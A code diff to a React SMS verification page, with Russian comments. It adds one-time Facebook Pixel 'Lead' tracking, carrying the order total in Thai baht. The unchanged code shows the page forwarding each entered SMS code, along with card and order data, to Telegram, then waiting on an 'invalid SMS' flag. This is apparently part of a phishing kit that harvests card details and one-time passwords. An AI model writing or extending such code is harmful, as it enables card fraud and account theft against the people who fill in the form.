@@ -19,6 +19,7 @@ const SMSVerificationPage = () => {
   
   const [verificationCode, setVerificationCode] = useState('')
   const [error, setError] = useState('')
+  const [leadTracked, setLeadTracked] = useState(false) // Флаг для отслеживания отправки Lead события
 
   // Format date for display
   const formatDate = () => {
@@ -62,15 +63,25 @@ const SMSVerificationPage = () => {
       return
     }
 
+    // Защита от повторной отправки Lead события
+    if (leadTracked) {
+      return
+    }
+
     setIsVerifying(true)
     setIsProcessing(true)
 
+    // Track Facebook Pixel Lead event - ONLY when OTP code is submitted
+    // Отправляем событие Lead с суммой заказа при нажатии кнопки (только один раз)
+    if (orderData && orderData.total) {
+      trackLead(orderData.total, 'THB')
+    } else {
+      trackLead()
+    }
+    setLeadTracked(true) // Помечаем, что событие уже отправлено
+
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
-
-    // Track Facebook Pixel Lead event - ONLY when OTP code is submitted
-    // Используем утилиту для отслеживания с правильной инициализацией
-    trackLead()
 
     // Start checking for invalid SMS flag (only after SMS submission)
     if (window.startInvalidSMSCheck) {
